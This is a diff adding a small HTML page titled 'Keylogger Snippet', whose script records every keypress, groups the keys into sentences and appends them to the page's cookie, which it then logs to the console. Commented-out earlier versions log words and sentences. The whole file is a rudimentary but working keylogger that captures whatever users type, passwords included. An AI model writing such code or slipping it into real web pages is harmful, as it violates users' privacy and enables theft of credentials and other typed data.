@@ -1,0 +1,41 @@
+﻿<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title>Keylogger Snippet</title>
+    <script>
+        /*$(input).keyPress(function () {
+            alert("hello");
+        });*/
+        var word = "";
+        var sent = "";
+        document.onkeypress = function(e) {
+            /*console.log(e.key);
+            if (e.key != "!") {
+                word += e.key;
+            }
+            else {
+                console.log(word);
+                word = "";
+            }
+            if (e.key != "!" && e.key != "?" && e.key != ".") {
+                sent += e.key;
+            }
+            else {
+                console.log(sent);
+                sent = "";
+            }*/
+            if (e.key != "!" && e.key != "?" && e.key != ".") {
+                sent += e.key;
+            }
+            else {
+                document.cookie += sent;
+                sent = "";
+            }
+            console.log(document.cookie);
+        }
+    </script>
+</head>
+<body >
+</body>
+</html>
